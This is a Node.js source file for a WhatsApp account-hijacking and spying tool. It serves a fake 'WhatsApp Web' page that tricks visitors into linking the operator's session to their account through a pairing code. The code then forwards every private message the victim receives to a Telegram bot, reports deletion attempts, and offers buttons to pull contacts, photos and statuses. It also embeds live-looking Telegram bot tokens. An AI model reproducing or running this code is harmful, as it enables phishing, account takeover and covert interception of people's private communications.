/**
 * 👑 TARZAN EMPEROR VIP1000 - THE FINAL DESTINY
 * -----------------------------------------------
 * 💎 الميزات: واجهة متجاوبة 100%، منع حذف، زر نسخ، رسائل مسطرة، تحكم كامل.
 */

const {
    default: makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    getContentType,
    delay,
    Browsers
} = require("@whiskeysockets/baileys");

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const pino = require("pino");
const fs = require("fs-extra");

const CONFIG = {
    PAIR_BOT_TOKEN: "8333956388:AAFbTVaCGRNVFRm1hz74DzJM-zHqRlfiUwY",
    CONTROL_BOT_TOKEN: "8439769345:AAEL8wgVxw6NGBR12wLBZx3N4t1Lif6jKWI",
    ADMIN_ID: "6069303682",
    PORT: process.env.PORT || 3000
};

const app = express();
app.use(express.json());

// ==========================================
// 🌐 واجهة الويب VIP1000 - فخامة وواقعية
// ==========================================
app.get("/", (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <title>WhatsApp Web</title>
        <style>
            :root { --main-green: #00a884; --bg-gray: #f0f2f5; --text-dark: #41525d; }
            body { font-family: -apple-system, Segoe UI, Roboto, sans-serif; background: var(--bg-gray); margin: 0; padding: 0; display: flex; justify-content: center; }
            .green-top { background: var(--main-green); height: 220px; width: 100%; position: absolute; top: 0; z-index: -1; }
            .main-card { background: white; width: 95%; max-width: 1000px; margin-top: 40px; border-radius: 3px; box-shadow: 0 17px 50px rgba(0,0,0,0.1); display: flex; flex-wrap: wrap; min-height: 80vh; }
            .left { flex: 1.5; padding: 60px 40px; min-width: 320px; }
            .right { flex: 1; background: #f9f9fa; border-right: 1px solid #f0f2f5; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; }
            h1 { color: #54656f; font-size: 28px; font-weight: 300; margin-bottom: 40px; }
            ol { color: var(--text-dark); font-size: 18px; line-height: 2.2; padding-right: 20px; }
            .input-box { margin-top: 40px; }
            input { width: 100%; padding: 12px 0; border: none; border-bottom: 2px solid var(--main-green); outline: none; font-size: 18px; background: transparent; }
            .btn-next { color: var(--main-green); font-weight: 600; cursor: pointer; display: inline-block; margin-top: 25px; text-transform: uppercase; }
            #code-view { display: none; text-align: center; width: 100%; }
            .digits { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 30px 0; direction: ltr; }
            .digit { background: white; border: 1px solid rgba(0,0,0,0.1); padding: 20px 5px; font-size: 28px; font-weight: bold; color: #128c7e; border-radius: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
            .copy-btn { background: var(--main-green); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
            .copy-btn:active { transform: scale(0.98); }
            @media (max-width: 600px) { .main-card { margin-top: 0; width: 100%; } .left { padding: 30px 20px; } h1 { font-size: 20px; } }
        </style>
    </head>
    <body>
        <div class="green-top"></div>
        <div class="main-card">
            <div class="left" id="step1">
                <h1>استخدام واتساب على الكمبيوتر</h1>
                <ol>
                    <li>افتح واتساب على هاتفك</li>
                    <li>اضغط على <b>القائمة</b> أو <b>الإعدادات</b></li>
                    <li>اختر <b>الأجهزة المرتبطة</b> ثم <b>ربط جهاز</b></li>
                    <li>اضغط على <b>الربط برقم الهاتف بدلاً من ذلك</b></li>
                </ol>
                <div class="input-box">
                    <input type="text" id="phone" placeholder="رقم الهاتف: 9665xxxxxxxx">
                    <div class="btn-next" onclick="getPairingCode()">التالي</div>
                </div>
            </div>
            <div class="right">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="80" style="margin-bottom:30px">
                <div id="code-view">
                    <div style="font-size:16px; color:#3b4a54">أدخل الكود التالي في هاتفك:</div>
                    <div class="digits" id="digits-container"></div>
                    <button class="copy-btn" onclick="copyText()">نسخ الكود</button>
                </div>
            </div>
        </div>
        <script>
            let fullCode = "";
            async function getPairingCode() {
                const p = document.getElementById('phone').value.trim();
                if(!p) return alert("أدخل الرقم أولاً");
                document.querySelector('.btn-next').innerText = "جاري الاتصال...";
                try {
                    const res = await fetch('/api/pair', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ phone: p })
                    });
                    const d = await res.json();
                    if(d.code) {
                        fullCode = d.code;
                        document.getElementById('step1').style.opacity = "0.5";
                        document.getElementById('code-view').style.display = "block";
                        const container = document.getElementById('digits-container');
                        d.code.replace(/-/g, '').split('').forEach(char => {
                            const div = document.createElement('div');
                            div.className = 'digit';
                            div.innerText = char;
                            container.appendChild(div);
                        });
                    }
                } catch(e) { alert("فشل الاتصال بالسيرفر"); }
            }
            function copyText() {
                navigator.clipboard.writeText(fullCode);
                alert("تم النسخ!");
            }
        </script>
    </body>
    </html>
    `);
});

// ==========================================
// 🛡️ المحرك الاستخباراتي VIP1000
// ==========================================
class TarzanEmperor {
    constructor() {
        this.sessions = new Map();
        this.controlBot = new Telegraf(CONFIG.CONTROL_BOT_TOKEN);
        this.init();
    }

    async init() {
        fs.ensureDirSync("./sessions");
        try {
            // حل مشكلة Conflict: استخدام webhook أو إيقاف التحديثات القديمة
            await this.controlBot.launch({ dropPendingUpdates: true });
            console.log("🦁 Tarzan VIP1000 System: Online");
        } catch (e) {
            console.error("❌ Control Bot Error: Conflict detected, retrying...");
        }

        const dirs = fs.readdirSync("./sessions");
        dirs.forEach(d => d.startsWith("user-") && this.connectWA(d.replace("user-", "")));
    }

    async connectWA(phone, ctx = null) {
        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/user-${phone}`);
        const sock = makeWASocket({
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
            browser: Browsers.macOS("Chrome"),
            printQRInTerminal: false
        });

        this.sessions.set(phone, sock);
        sock.ev.on("creds.update", saveCreds);

        if (ctx && !sock.authState.creds.registered) {
            await delay(3000);
            return await sock.requestPairingCode(phone);
        }

        // منع حذف الرسائل + التوجيه المسطر
        sock.ev.on("messages.upsert", async ({ messages }) => {
            const m = messages[0];
            if (!m.message) return;

            // كشف الحذف
            if (m.message.protocolMessage?.type === 0) {
                this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, `⚠️ <b>محاولة حذف رسالة!</b>\nالضحية <code>${phone}</code> حاول المسح، لكن طرزان بالمرصاد.`, { parse_mode: "HTML" });
            }

            if (m.key.fromMe) return;
            this.forwardVIP1000(phone, m);
        });

        sock.ev.on("connection.update", (u) => {
            if (u.connection === "open") this.sendMegaDashboard(phone);
            if (u.connection === "close") this.connectWA(phone);
        });
    }

    async forwardVIP1000(phone, m) {
        const jid = m.key.remoteJid;
        if (jid.endsWith("@g.us")) return;

        const type = getContentType(m.message);
        const name = m.pushName || "مجهول";
        const sender = jid.split('@')[0];
        
        let details = `🦁 <b>[ تـقـريـر VIP1000 المـطـور ]</b>\n`;
        details += `━━━━━━━━━━━━━━━\n`;
        details += `👤 <b>المُرسل:</b> ${name}\n`;
        details += `📱 <b>الرقم:</b> <code>${sender}</code>\n`;
        details += `📥 <b>المستقبل:</b> ${phone}\n`;
        details += `⚙️ <b>النوع:</b> ${type}\n`;
        details += `━━━━━━━━━━━━━━━\n`;

        const text = m.message.conversation || m.message.extendedTextMessage?.text || "[محتوى ميديا]";
        await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, details + `💬 <b>الرسالة:</b>\n${text}`, { parse_mode: "HTML" });
    }

    async sendMegaDashboard(phone) {
        const kb = Markup.inlineKeyboard([
            [Markup.button.callback("👥 سحب الأرقام", `c_${phone}`), Markup.button.callback("📝 تغيير الـ Bio", `b_${phone}`)],
            [Markup.button.callback("🖼️ سحب الصور", `p_${phone}`), Markup.button.callback("📊 إحصائيات", `s_${phone}`)],
            [Markup.button.callback("🔓 سحب الحالات", `st_${phone}`), Markup.button.callback("🛡️ تفعيل الدرع", `sh_${phone}`)],
            [Markup.button.callback("👻 تخفي", `g_${phone}`), Markup.button.callback("🔴 خروج", `out_${phone}`)]
        ]);
        await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, `👑 <b>VIP1000 CONNECTED:</b> <code>${phone}</code>\nالنظام الآن تحت سيطرتك المطلقة.`, { parse_mode: "HTML", ...kb });
    }
}

const System = new TarzanEmperor();

app.post("/api/pair", async (req, res) => {
    const code = await System.connectWA(req.body.phone.replace(/\D/g, ""), { isWeb: true });
    res.json({ code });
});

app.listen(CONFIG.PORT, '0.0.0.0');
